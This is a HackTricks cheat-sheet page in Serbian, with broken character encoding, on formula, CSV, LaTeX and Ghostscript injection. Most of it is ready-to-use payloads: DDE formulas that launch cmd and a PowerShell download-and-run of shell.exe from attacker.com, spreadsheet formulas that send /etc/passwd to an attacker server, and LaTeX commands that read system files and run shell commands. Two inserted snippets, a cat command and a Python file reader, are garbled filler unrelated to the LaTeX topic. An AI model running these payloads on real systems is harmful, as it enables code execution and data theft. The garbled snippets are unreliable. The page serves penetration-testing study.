# Formula/CSV/Doc/LaTeX/GhostScript Injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

PronaÄ‘ite najvaÅ¾nije ranjivosti kako biste ih brÅ¾e popravili. Intruder prati vaÅ¡u povrÅ¡inu napada, pokreÄ‡e proaktivne pretnje, pronalazi probleme u celokupnom tehnoloÅ¡kom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Formula Injection

### Informacije

Ako se vaÅ¡ **unos** reflektuje unutar **CSV fajlova** (ili bilo kog drugog fajla koji Ä‡e verovatno biti otvoren u **Excel-u**), moÅ¾da Ä‡ete moÄ‡i da unesete Excel **formule** koje Ä‡e biti **izvrÅ¡ene** kada korisnik **otvori fajl** ili kada korisnik **klikne na neki link** unutar Excel tabele.

{% hint style="danger" %}
Danas Ä‡e **Excel upozoriti** (nekoliko puta) korisnika kada se neÅ¡to uÄita izvan Excel-a kako bi ga spreÄio od zlonamernih radnji. Stoga, poseban napor na socijalnom inÅ¾enjeringu mora biti primenjen na krajnji payload.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hiperlink

**SledeÄ‡i primer je veoma koristan za eksfiltraciju sadrÅ¾aja iz konaÄnog Excel dokumenta i za izvrÅ¡avanje zahteva ka proizvoljnim lokacijama. MeÄ‘utim, zahteva da korisnik klikne na link (i prihvati upozorenja).**

SledeÄ‡i primer je preuzet sa [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Zamislite da je doÅ¡lo do bezbednosnog propusta u sistemu za upravljanje evidencijama studenata koji je iskoriÅ¡Ä‡en putem napada CSV ubacivanjem. Primarni cilj napadaÄa je da kompromituje sistem koji koriste nastavnici za upravljanje detaljima studenata. Metoda ukljuÄuje ubacivanje zlonamernog payload-a u aplikaciju, taÄnije unoÅ¡enje Å¡tetnih formula u polja namenjena za detalje studenata. Napad se odvija na sledeÄ‡i naÄin:

1. **Ubacivanje zlonamernog payload-a:**
- NapadaÄ podnosi formu za detalje studenata, ali ukljuÄuje formulu koja se Äesto koristi u tabelama (npr. `=HYPERLINK("<zlonamerni_link>","Kliknite ovde")`).
- Ova formula je dizajnirana da kreira hiperlink, ali ona vodi ka zlonamernom serveru koji je pod kontrolom napadaÄa.

2. **Izvoz kompromitovanih podataka:**
- Nastavnici, nesvesni kompromitacije, koriste funkcionalnost aplikacije za izvoz podataka u CSV fajl.
- CSV fajl, kada se otvori, i dalje sadrÅ¾i zlonamerni payload. Ovaj payload se pojavljuje kao klikabilni hiperlink u tabeli.

3. **Pokretanje napada:**
- Nastavnik klikne na hiperlink, verujuÄ‡i da je to legitimni deo detalja o studentu.
- Nakon klika, osetljivi podaci (potencijalno ukljuÄujuÄ‡i detalje iz tabele ili raÄunara nastavnika) se prenose na server napadaÄa.

4. **Logovanje podataka:**
- Server napadaÄa prima i beleÅ¾i osetljive podatke poslate sa raÄunara nastavnika.
- NapadaÄ moÅ¾e zatim koristiti ove podatke u razne zlonamerne svrhe, dalje kompromitujuÄ‡i privatnost i bezbednost studenata i institucije.


### RCE

**Proverite [originalni post](https://notsosecure.com/data-exfiltration-formula-injection-part1) za dodatne detalje.**

U odreÄ‘enim konfiguracijama ili starijim verzijama Excel-a, funkcionalnost nazvana Dynamic Data Exchange (DDE) moÅ¾e biti iskoriÅ¡Ä‡ena za izvrÅ¡avanje proizvoljnih komandi. Da biste to iskoristili, moraju biti omoguÄ‡ene sledeÄ‡e postavke:

- Idite na File â†’ Options â†’ Trust Center â†’ Trust Center Settings â†’ External Content i omoguÄ‡ite **Dynamic Data Exchange Server Launch**.

Kada se otvori tabela sa zlonamernim payload-om (i ako korisnik prihvati upozorenja), payload se izvrÅ¡ava. Na primer, da biste pokrenuli kalkulator aplikaciju, payload bi bio:
```markdown
`=cmd|' /C calc'!xxx`
```
Dodatne komande takoÄ‘e mogu biti izvrÅ¡ene, kao Å¡to je preuzimanje i izvrÅ¡avanje fajla koristeÄ‡i PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Lokalno ukljuÄivanje datoteka (LFI) u LibreOffice Calc

LibreOffice Calc se moÅ¾e koristiti za Äitanje lokalnih datoteka i izvlaÄenje podataka. Evo nekih metoda:

- ÄŒitanje prvog reda iz lokalne datoteke `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
- IzvlaÄenje proÄitanih podataka na server pod kontrolom napadaÄa: `=WEBSERVICE(CONCATENATE("http://<napadaÄeva IP adresa>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- IzvlaÄenje viÅ¡e od jednog reda: `=WEBSERVICE(CONCATENATE("http://<napadaÄeva IP adresa>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- DNS izvlaÄenje (slanje proÄitanih podataka kao DNS upita na DNS server pod kontrolom napadaÄa): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<napadaÄeva domena>"))`

### Google Sheets za izvlaÄenje podataka izvan opsega (OOB)

Google Sheets nudi funkcije koje se mogu iskoristiti za izvlaÄenje podataka izvan opsega:

- **CONCATENATE**: Spaja nizove - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: Uvozi podatke iz strukturiranih vrsta podataka - `=IMPORTXML(CONCAT("http://<napadaÄeva IP adresa:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: Uvozi RSS ili ATOM feedove - `=IMPORTFEED(CONCAT("http://<napadaÄeva IP adresa:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: Uvozi podatke iz HTML tabela ili listi - `=IMPORTHTML (CONCAT("http://<napadaÄeva IP adresa:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: Uvozi opseg Ä‡elija iz druge tabele - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
- **IMAGE**: Ubacuje sliku u Ä‡eliju - `=IMAGE("https://<napadaÄeva IP adresa:Port>/images/srpr/logo3w.png")`


## LaTeX ubacivanje

ObiÄno serveri koje Ä‡ete pronaÄ‡i na internetu koji **pretvaraju LaTeX kod u PDF** koriste **`pdflatex`**.\
Ovaj program koristi 3 glavna atributa za (ne)dozvoljavanje izvrÅ¡avanja komandi:

* **`--no-shell-escape`**: **OnemoguÄ‡ava** konstrukciju `\write18{command}`, Äak i ako je omoguÄ‡ena u datoteci texmf.cnf.
* **`--shell-restricted`**: Isto kao `--shell-escape`, ali **ograniÄeno** na 'siguran' skup **unapred definisanih** \*\*komandi (\*\*Na Ubuntu 16.04 lista se nalazi u `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **OmoguÄ‡ava** konstrukciju `\write18{command}`. Komanda moÅ¾e biti bilo koja shell komanda. Ova konstrukcija je obiÄno zabranjena iz sigurnosnih razloga.

MeÄ‘utim, postoje i druge metode izvrÅ¡avanja komandi, pa je radi izbegavanja RCE-a vrlo vaÅ¾no koristiti `--shell-restricted`.

### ÄŒitanje datoteke <a href="#read-file" id="read-file"></a>

MoÅ¾da Ä‡ete morati prilagoditi ubacivanje sa omotaÄima kao Å¡to su \[ ili $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### ÄŒitanje jednolinijske datoteke

Da biste proÄitali sadrÅ¾aj jednolinijske datoteke, moÅ¾ete koristiti sledeÄ‡i kod:

```bash
cat ime_datoteke
```

Gde `ime_datoteke` predstavlja ime datoteke koju Å¾elite da proÄitate.

Ovaj kod Ä‡e prikazati sadrÅ¾aj datoteke na ekranu.
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### ÄŒitanje viÅ¡elinijske datoteke

Da biste proÄitali viÅ¡elinijsku datoteku, moÅ¾ete koristiti sledeÄ‡i kod:

```python
with open('ime_datoteke.txt', 'r') as file:
    lines = file.readlines()
    for line in lines:
        print(line.strip())
```

Ovaj kod otvara datoteku sa zadatim imenom (`ime_datoteke.txt`) u reÅ¾imu Äitanja (`'r'`). Zatim koristi metodu `readlines()` da proÄita sve linije iz datoteke i smeÅ¡ta ih u listu `lines`. Nakon toga, petlja prolazi kroz svaku liniju u listi i koristi metodu `strip()` da ukloni sve praznine sa poÄetka i kraja linije pre nego Å¡to je prikaÅ¾e na ekranu.

Napomena: Promenite `'ime_datoteke.txt'` sa stvarnim imenom datoteke koju Å¾elite da proÄitate.
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Pisanje datoteke <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### IzvrÅ¡avanje komande <a href="#izvrÅ¡avanje-komande" id="izvrÅ¡avanje-komande"></a>

Ulaz komande Ä‡e biti preusmeren na stdin, koristite privremenu datoteku da je dobijete.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Ako dobijete bilo kakvu LaTex greÅ¡ku, razmislite o koriÅ¡Ä‡enju base64 da biste dobili rezultat bez loÅ¡ih karaktera.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

Iz [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript ubacivanje

**Proverite [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)**

## Reference

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

PronaÄ‘ite najvaÅ¾nije ranjivosti kako biste ih brÅ¾e popravili. Intruder prati vaÅ¡u povrÅ¡inu napada, pokreÄ‡e proaktivne pretnje, pronalazi probleme u celom vaÅ¡em tehnoloÅ¡kom skupu, od API-ja do veb aplikacija i sistemima u oblaku. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
